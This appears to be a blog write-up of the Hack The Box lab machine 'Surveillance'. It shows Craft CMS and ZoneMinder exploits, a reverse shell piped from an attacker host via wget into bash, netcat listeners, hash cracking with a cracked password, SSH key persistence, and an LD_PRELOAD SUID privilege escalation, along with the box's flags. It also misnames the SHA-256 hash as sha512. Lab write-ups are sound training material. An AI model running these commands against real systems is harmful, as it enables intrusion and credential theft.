---
title: "surveillance from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# surveillance from HTB
`nmap`showed nothing unusual.
add this to `/etc/hosts`
```
10.10.11.245 surveillance.htb
```
Then access the site. At the end of the site there is a version which is site running on.
There is an exploit on that which i found in
```
https://github.com/0xfalafel/CraftCMS_CVE-2023-41892
```
I executed it and got `cmd`
```python
python3 craftCms_4.4.14.py http://surveillance.htb/
```
Then i created `reverse.sh`for `reverse shell`and uploaded it, then executed
```bash
wget http://10.10.16.6:8000/reverse.sh|bash
bash reverse.sh
```
I got connection on `netcat`
```bash
rlwrap nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.11.245] 52290
www-data@surveillance:/$ script /dev/null -c bash
www-data@surveillance:/$ cd /var/www/html/craft/storage/backups/
```
`unzip`the `sql`file
Then read it and `with word search find user`
```bash
www-data@surveillance:~/html/craft/storage/backups$ cat surveillance--2023-10-17-202801--v4.4.14.sql
---------------
---------
----
----------
---------------
INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','admin@surveillance.htb','39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec','2023-10-17 20:22:34',NULL,NULL,NULL,'2023-10-11 18:58:57',NULL,1,NULL,NULL,NULL,0,'2023-10-17 20:27:46','2023-10-11 17:57:16','2023-10-17 20:27:46');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
```
There is the password for `matthew`---- `39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec`
With `hashid`i found out that it's `sha512`and i cracked it with `hashcat`
```bash
hashcat -m 1400 hash /usr/share/wordlists/rockyou.txt
-----
------------
39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec:starcraft122490
```
Then went and connected to `ssh matthew@10.10.11.245` With password
***
User Flag is: 9acc62906a3ec24021f196fcf1abc4be
***
`sudo -l`showed nothing, we have to become other user.
with `ss -tlnp`i got that there is an `8080`port running internally
```
ss -tlnp
LISTEN              0                   511                                   127.0.0.1:8080                                  0.0.0.0:*
```
Then i did port forwarding
```
 ssh matthew@surveillance.htb -L 8082:127.0.0.1:8080
```
Accessed it with `127.0.0.1:8082`
Logged as `admin -- starcraft122490`
Then found that `zoneminder v1.36.32`There is an exploit on that.
```
https://github.com/rvizx/CVE-2023-26035/blob/main/exploit.py
```
I ran that exploit with this:
```
python3 exploit.py -t <target_url> -ip <attacker-ip> -p <port>
```
And i got connection on `netcat`
i became `zoneminder` but i didn't know password so i couldn't find out what i can do `with root permission`
So generate `ssh`keys and connect to `ssh`
```bash
zoneminder@surveillance:~$ ssh-keygen
--------
------------
--------------
Your identification has been saved in ./ssh-key
Your public key has been saved in ./ssh-key.pub
```
Save `ssh-key`to your machine and `chmod 600 ssh-key`
move `ssh-key.pub`to `~/.ssh/authorized_keys`
```bash
 echo 'ssh-rsa AAAAB3NzaC1yc..............' > ~/.ssh/authorized_keys
```
I found out what i can do
```bash
zoneminder@surveillance:~$ sudo -l
User zoneminder may run the following commands on surveillance:
    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *
```
On the site i forwarded in `options > config`i found `LD_PRELOAD`which uses  `zmdc.pl` file.
We can create an file which is preloaded as server starts. `THERE add the file directory which should be preloaded` for me it is `/tmp/help`and click `save`
create an `.c`file
```C
#include <stdio.h>
#include <stdlib.h>
void _init() {
        unsetenv("LD_PRELOAD");
	system("chmod u+s /bin/bash");
}
```
then
```
gcc -shared  main.c -o help -nostartfiles
```
Then
```bash
sudo zmdc.pl startup zmdc
```
And if you did everything correct you can become root with
```bash
bash -p
```
***
Root Flag is: 7699ad0bd39de4f6886b2f3c46092ad9
***
![](/assets/images/Screenshot from 2024-08-18 15-27-35.png)
